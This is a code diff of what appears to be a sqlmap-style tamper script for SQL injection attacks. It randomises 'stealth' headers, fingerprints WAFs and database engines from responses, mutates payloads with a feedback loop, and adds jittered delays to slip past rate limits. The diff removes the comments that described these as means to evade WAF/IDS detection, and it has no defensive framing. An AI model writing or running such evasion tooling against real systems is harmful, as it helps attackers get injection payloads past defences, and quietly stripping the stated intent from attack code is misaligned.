@@ -71,7 +71,6 @@ state = {
 # ===========================
 
 USER_AGENTS = [
-    # Realistic browser user agents
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
     " Chrome/115.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko)"
@@ -96,10 +95,6 @@ ACCEPT_LANGS = [
 ]
 
 def generate_stealth_headers():
-    """
-    Generate randomized HTTP headers to mimic human traffic and evade WAFs/IDS.
-    Returns a dict of headers.
-    """
     headers = {
         'User-Agent': random.choice(USER_AGENTS),
         'Referer': random.choice(REFERERS),
@@ -107,7 +102,6 @@ def generate_stealth_headers():
         'Cache-Control': 'no-cache',
         'Pragma': 'no-cache',
         'Connection': 'keep-alive',
-        # Random custom header sometimes to confuse filters
         f'X-Custom-{random.choice(string.ascii_uppercase)}': ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
     }
     return headers
@@ -275,32 +269,28 @@ def detect_context(p):
     return 'generic'
 
 def random_delay(base=1.5, jitter=1.0):
-    """
-    Random delay to mimic human interaction timing and evade rate limiting.
-    Base delay + random jitter (seconds).
-    """
     delay_time = base + random.uniform(0, jitter)
     time.sleep(delay_time)
 
-def tamper(payload, response='', success=None):
+def tamper(payload, **kwargs):
     """
     Core tamper function with adaptive mutation, WAF/DBMS detection,
     feedback learning, stealth delay, and header manipulation.
     """
-    # Adaptive fingerprinting for WAF and DBMS
+    response = kwargs.get('response', '')
+    success = kwargs.get('success', None)
+
     resp_lower = response.lower()
     state['waf_detected'] = any(sig in resp_lower for sig in WAF_SIGS)
     for db, sigs in DBMS_SIGS.items():
         if any(s in resp_lower for s in sigs):
             state['dbms'] = db
 
-    # Avoid fingerprint duplication
     fp = fingerprint(payload)
     if fp in state['seen_hashes']:
         payload += random.choice(string.ascii_letters)
     state['seen_hashes'].add(fp)
 
-    # Replay best mutation chains sometimes for stability
     if state['success_chains'] and random.random() > 0.7:
         chain = random.choice(state['success_chains'])
         p = payload
@@ -315,7 +305,6 @@ def tamper(payload, response='', success=None):
     else:
         mutated = recursive_mutate(payload)
 
-    # Feedback loop updates success/failure stats
     if success is not None:
         for name in state.get('mutation_history', []):
             update_stats(name, success)
@@ -325,10 +314,8 @@ def tamper(payload, response='', success=None):
         else:
             state['backoff'] = min(5.0, state['backoff'] * 1.5)
 
-    # Stealth delay to avoid rate limits and detection
     random_delay(base=1.5 * state['backoff'], jitter=1.5)
 
-    # Output formatting based on detected payload context
     ctx = detect_context(payload)
     if ctx == 'graphql':
         return json.dumps({"query": f"{{user(input:\\\"{mutated}\\\"){{id}}}}"})
